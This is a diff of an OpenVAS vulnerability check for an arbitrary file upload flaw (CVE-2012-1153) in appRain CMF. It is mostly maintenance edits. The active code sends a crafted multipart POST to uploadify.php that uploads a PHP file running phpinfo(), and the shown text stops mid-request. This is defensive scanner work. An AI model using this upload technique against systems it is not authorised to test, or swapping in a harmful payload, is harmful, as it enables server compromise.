@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_apprain_51576.nasl 11327 2018-09-11 11:35:07Z asteins $
+# $Id: gb_apprain_51576.nasl 11435 2018-09-17 13:44:25Z cfischer $
 #
 # appRain CMF 'uploadify.php' Remote Arbitrary File Upload Vulnerability
 #
@@ -25,18 +25,18 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-if (description)
+if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.103395");
   script_cve_id("CVE-2012-1153");
   script_bugtraq_id(51576);
-  script_version("$Revision: 11327 $");
+  script_version("$Revision: 11435 $");
   script_tag(name:"cvss_base", value:"6.8");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
   script_name("appRain CMF 'uploadify.php' Remote Arbitrary File Upload Vulnerability");
   script_xref(name:"URL", value:"http://www.securityfocus.com/bid/51576");
   script_xref(name:"URL", value:"http://www.apprain.com");
-  script_tag(name:"last_modification", value:"$Date: 2018-09-11 13:35:07 +0200 (Tue, 11 Sep 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-17 15:44:25 +0200 (Mon, 17 Sep 2018) $");
   script_tag(name:"creation_date", value:"2012-01-23 11:04:51 +0100 (Mon, 23 Jan 2012)");
   script_category(ACT_ATTACK);
   script_tag(name:"qod_type", value:"remote_vul");
@@ -59,14 +59,19 @@ the context of the vulnerable application.");
 the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are
 to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
   script_tag(name:"solution_type", value:"WillNotFix");
+
   exit(0);
 }
 
 include("http_func.inc");
 include("http_keepalive.inc");
+include("misc_func.inc");
 
 port = get_http_port( default:80 );
 if( ! can_host_php( port:port ) ) exit( 0 );
+
+vtstring = get_vt_string( lowercase:TRUE );
+host = http_host_name( port:port );
 
 foreach dir( make_list_unique( "/apprain", "/cms", cgi_dirs( port:port ) ) ) {
 
@@ -76,14 +81,13 @@ foreach dir( make_list_unique( "/apprain", "/cms", cgi_dirs( port:port ) ) ) {
 
   if( "Start with appRain" >< buf ) {
 
-    host = http_host_name( port:port );
-    file = "openvas-" + rand() + ".php";
+    file = vtstring + "-" + rand() + ".php";
     ex ="<?php phpinfo();?>";
     len = 110 + strlen(ex);
 
-    req = string("POST ",dir,"/webroot/addons/uploadify/uploadify.php HTTP/1.0\r\n",
-		 "Host: ",host,"\r\n",
-		 "Content-Length: ",len,"\r\n",
+    req = string("POST ", dir, "/webroot/addons/uploadify/uploadify.php HTTP/1.0\r\n",
+		 "Host: ", host, "\r\n",
+		 "Content-Length: ", len, "\r\n",
 		 "Content-Type: multipart/form-data; boundary=o0oOo0o\r\n",
 		 "Connection: close\r\n",
 		 "\r\n",
